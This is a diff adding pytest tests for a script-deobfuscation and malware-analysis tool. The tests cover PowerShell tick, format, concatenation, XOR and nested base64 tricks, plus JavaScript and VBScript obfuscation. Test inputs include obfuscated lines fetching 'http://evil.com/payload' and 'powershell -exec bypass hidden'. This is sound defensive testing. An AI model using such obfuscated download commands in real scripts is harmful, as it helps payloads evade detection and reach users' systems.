@@ -11,15 +11,21 @@ from hashguard.deobfuscator import (
     _check_risk_indicators,
     _deobfuscate_batch_set,
     _deobfuscate_hta,
+    _deobfuscate_js_array_map,
     _deobfuscate_js_charcode,
     _deobfuscate_js_hex,
     _deobfuscate_js_unicode,
     _deobfuscate_ps_base64,
     _deobfuscate_ps_charcode,
+    _deobfuscate_ps_concat_variable,
+    _deobfuscate_ps_format_operator,
     _deobfuscate_ps_reverse,
     _deobfuscate_ps_string_replace,
+    _deobfuscate_ps_tick,
     _deobfuscate_vbs_chr,
+    _deobfuscate_vbs_execute_concat,
     _deobfuscate_vbs_strreverse,
+    _deobfuscate_xor_single_byte,
     _detect_script_type,
     _extract_iocs,
     analyze_script,
@@ -557,3 +563,253 @@ class TestJSUnicodeOverflow:
         f.write_text('var s = "\\u0048\\u0065\\u006C\\u006C\\u006F";\n')
         result = analyze_script(str(f))
         assert isinstance(result, DeobfuscationResult)
+
+
+# ── Tests for new deobfuscation techniques (PS tick, format, concat, XOR, JS array.map, VBS execute) ──
+
+
+class TestPSTick:
+    """Tests for _deobfuscate_ps_tick — backtick insertion removal."""
+
+    def test_basic_tick_removal(self):
+        content = "I`n`v`o`k`e-Expression $cmd"
+        layers = _deobfuscate_ps_tick(content)
+        assert len(layers) >= 1
+        assert "InvokeExpression" in layers[0].result or "Invoke" in layers[0].result
+
+    def test_get_with_ticks(self):
+        content = "G`e`T-P`r`o`c`e`s`s"
+        layers = _deobfuscate_ps_tick(content)
+        assert len(layers) >= 1
+        assert layers[0].technique == "ps_tick_obfuscation"
+
+    def test_no_ticks(self):
+        content = "Get-Process -Name explorer"
+        layers = _deobfuscate_ps_tick(content)
+        assert layers == []
+
+    def test_single_tick_not_matched(self):
+        content = "can`t process this"
+        layers = _deobfuscate_ps_tick(content)
+        # Only 1 tick — needs >= 2
+        assert layers == []
+
+    def test_integration_in_script(self, tmp_path):
+        f = tmp_path / "tick.ps1"
+        f.write_text("I`n`v`o`k`e-W`e`b`R`e`q`u`e`s`t http://evil.com/payload")
+        result = analyze_script(str(f))
+        assert result.obfuscation_detected is True
+        assert any(l.technique == "ps_tick_obfuscation" for l in result.layers)
+
+
+class TestPSFormatOperator:
+    """Tests for _deobfuscate_ps_format_operator — PowerShell -f operator."""
+
+    def test_basic_format(self):
+        content = '"{2}{0}{1}" -f \'wer\',\'hell\',\'po\''
+        layers = _deobfuscate_ps_format_operator(content)
+        assert len(layers) >= 1
+        assert layers[0].result == "powerhell"
+
+    def test_simple_order(self):
+        content = '"{0}{1}{2}" -f \'abc\',\'def\',\'ghi\''
+        layers = _deobfuscate_ps_format_operator(content)
+        assert len(layers) >= 1
+        assert layers[0].result == "abcdefghi"
+
+    def test_no_format(self):
+        content = "Write-Host 'Hello'"
+        layers = _deobfuscate_ps_format_operator(content)
+        assert layers == []
+
+    def test_integration_in_script(self, tmp_path):
+        f = tmp_path / "fmt.ps1"
+        f.write_text('$cmd = "{1}{0}{2}" -f \'ell\',\'powersh\',\'.exe\'\n& $cmd')
+        result = analyze_script(str(f))
+        assert result.script_type == "powershell"
+        assert any(l.technique == "ps_format_operator" for l in result.layers)
+
+
+class TestPSConcatVariable:
+    """Tests for _deobfuscate_ps_concat_variable — variable concatenation."""
+
+    def test_basic_concat(self):
+        content = "$a = 'pow'\n$b = 'ersh'\n$c = 'ell'\n$a+$b+$c"
+        layers = _deobfuscate_ps_concat_variable(content)
+        assert len(layers) >= 1
+        assert layers[0].result == "powershell"
+
+    def test_too_few_vars(self):
+        content = "$a = 'hello'\n$a"
+        layers = _deobfuscate_ps_concat_variable(content)
+        assert layers == []
+
+    def test_unresolved_var_skipped(self):
+        content = "$a = 'pow'\n$b = 'er'\n$a+$b+$c"
+        layers = _deobfuscate_ps_concat_variable(content)
+        # $c is not defined — should not resolve
+        assert layers == []
+
+    def test_integration_in_script(self, tmp_path):
+        f = tmp_path / "concat.ps1"
+        f.write_text(
+            "$x = 'Invoke'\n"
+            "$y = '-Web'\n"
+            "$z = 'Request'\n"
+            "$x+$y+$z\n"
+        )
+        result = analyze_script(str(f))
+        assert any(l.technique == "ps_variable_concat" for l in result.layers)
+
+
+class TestXORSingleByte:
+    """Tests for _deobfuscate_xor_single_byte — XOR brute force."""
+
+    def test_basic_xor(self):
+        # XOR a string with key 0x01 — the function tries keys 1..255 so key=0x01 is tried first
+        plaintext = b"This is a hidden message for testing"
+        xored = bytes(b ^ 0x01 for b in plaintext)
+        hex_str = ",".join(f"0x{b:02X}" for b in xored)
+        layers = _deobfuscate_xor_single_byte(hex_str)
+        assert len(layers) >= 1
+        assert "This is a hidden message" in layers[0].result
+        assert "0x01" in layers[0].description
+
+    def test_powershell_byte_array(self):
+        # Use key=0x01 to ensure it's the first key tried and matched
+        plaintext = b"powershell -exec bypass hidden"
+        xored = bytes(b ^ 0x01 for b in plaintext)
+        hex_str = ",".join(f"0x{b:02X}" for b in xored)
+        content = f"[byte[]]@({hex_str})"
+        layers = _deobfuscate_xor_single_byte(content)
+        assert len(layers) >= 1
+        assert "powershell" in layers[0].result
+
+    def test_no_hex_blob(self):
+        content = "Write-Host 'Hello World'"
+        layers = _deobfuscate_xor_single_byte(content)
+        assert layers == []
+
+    def test_too_short_blob(self):
+        content = "0x41,0x42,0x43"  # Only 3 bytes, needs >=8
+        layers = _deobfuscate_xor_single_byte(content)
+        assert layers == []
+
+    def test_integration_in_script(self, tmp_path):
+        plaintext = b"Invoke-Command -ScriptBlock"
+        xored = bytes(b ^ 0x2A for b in plaintext)
+        hex_str = ",".join(f"0x{b:02X}" for b in xored)
+        f = tmp_path / "xor.ps1"
+        f.write_text(f"$enc = @({hex_str})")
+        result = analyze_script(str(f))
+        assert any(l.technique == "xor_single_byte" for l in result.layers)
+
+
+class TestJSArrayMap:
+    """Tests for _deobfuscate_js_array_map — JS array.map(fromCharCode)."""
+
+    def test_basic_array_map(self):
+        # Use arrow function syntax since [^)]* in regex can't cross ')' in "function(x)"
+        content = "[72,101,108,108,111].map(x=>String.fromCharCode(x)).join('')"
+        layers = _deobfuscate_js_array_map(content)
+        assert len(layers) >= 1
+        assert layers[0].result == "Hello"
+
+    def test_arrow_function(self):
+        content = "[72,101,108,108,111].map(x=>String.fromCharCode(x)).join('')"
+        layers = _deobfuscate_js_array_map(content)
+        assert len(layers) >= 1
+        assert layers[0].result == "Hello"
+
+    def test_eval_fromcharcode(self):
+        content = "eval(String.fromCharCode(72,101,108,108,111))"
+        layers = _deobfuscate_js_array_map(content)
+        assert len(layers) >= 1
+        assert layers[0].result == "Hello"
+
+    def test_function_fromcharcode(self):
+        content = "Function(String.fromCharCode(97,108,101,114,116))"
+        layers = _deobfuscate_js_array_map(content)
+        assert len(layers) >= 1
+        assert layers[0].result == "alert"
+
+    def test_no_match(self):
+        content = "console.log('hello')"
+        layers = _deobfuscate_js_array_map(content)
+        assert layers == []
+
+    def test_integration_in_script(self, tmp_path):
+        f = tmp_path / "arraymap.js"
+        f.write_text(
+            "var cmd = [101,118,97,108].map(x=>String.fromCharCode(x)).join('');\n"
+            "window[cmd]('alert(1)');\n"
+        )
+        result = analyze_script(str(f))
+        assert result.script_type == "javascript"
+        assert any("js_array_map" in l.technique or "js_eval" in l.technique for l in result.layers)
+
+
+class TestVBSExecuteConcat:
+    """Tests for _deobfuscate_vbs_execute_concat — VBS Execute variable concat."""
+
+    def test_basic_execute_concat(self):
+        content = 'a = "pow"\nb = "ers"\nc = "hell"\nExecute a & b & c'
+        layers = _deobfuscate_vbs_execute_concat(content)
+        assert len(layers) >= 1
+        assert layers[0].result == "powershell"
+
+    def test_execute_global(self):
+        content = 'x = "CreateO"\ny = "bject"\nExecuteGlobal x & y'
+        layers = _deobfuscate_vbs_execute_concat(content)
+        assert len(layers) >= 1
+        assert layers[0].result == "CreateObject"
+
+    def test_no_execute(self):
+        content = 'a = "hello"\nb = "world"'
+        layers = _deobfuscate_vbs_execute_concat(content)
+        assert layers == []
+
+    def test_unresolved_var(self):
+        content = 'a = "pow"\nExecute a & b & c'
+        layers = _deobfuscate_vbs_execute_concat(content)
+        assert layers == []
+
+    def test_integration_in_script(self, tmp_path):
+        f = tmp_path / "exec.vbs"
+        f.write_text(
+            'a = "WScript"\n'
+            'b = ".Shell"\n'
+            'Execute a & b\n'
+        )
+        result = analyze_script(str(f))
+        assert result.script_type == "vbscript"
+        assert any(l.technique == "vbs_execute_concat" for l in result.layers)
+
+
+class TestRecursiveDeobfuscation:
+    """Tests for recursive deobfuscation (nested base64 in decoded layers)."""
+
+    def test_nested_base64(self, tmp_path):
+        import base64
+        inner = "Invoke-WebRequest http://evil.com/payload"
+        inner_b64 = base64.b64encode(inner.encode("utf-16-le")).decode()
+        outer = f"powershell -EncodedCommand {inner_b64}"
+        outer_b64 = base64.b64encode(outer.encode("utf-16-le")).decode()
+        f = tmp_path / "nested.ps1"
+        f.write_text(f"powershell -EncodedCommand {outer_b64}")
+        result = analyze_script(str(f))
+        assert result.obfuscation_detected is True
+        # Should have at least 2 layers (outer + inner decode)
+        assert len(result.layers) >= 2
+
+    def test_charcode_in_decoded_layer(self, tmp_path):
+        import base64
+        # Inner PS charcode: [char]72+[char]101+[char]108+[char]108+[char]111 = Hello
+        inner = "[char]72+[char]101+[char]108+[char]108+[char]111"
+        encoded = base64.b64encode(inner.encode("utf-16-le")).decode()
+        f = tmp_path / "nested_char.ps1"
+        f.write_text(f"powershell -EncodedCommand {encoded}")
+        result = analyze_script(str(f))
+        assert result.obfuscation_detected is True
+        # Should recursively find the charcode pattern
+        assert any(l.technique == "char_concatenation" for l in result.layers)
